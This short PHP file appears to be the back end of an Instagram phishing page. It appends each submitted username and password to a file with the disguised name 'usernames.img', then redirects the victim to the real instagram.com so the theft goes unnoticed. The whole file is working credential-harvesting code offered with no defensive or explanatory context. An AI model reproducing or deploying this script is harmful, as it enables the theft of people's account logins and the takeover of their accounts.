<?php

file_put_contents("usernames.img", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();

?>
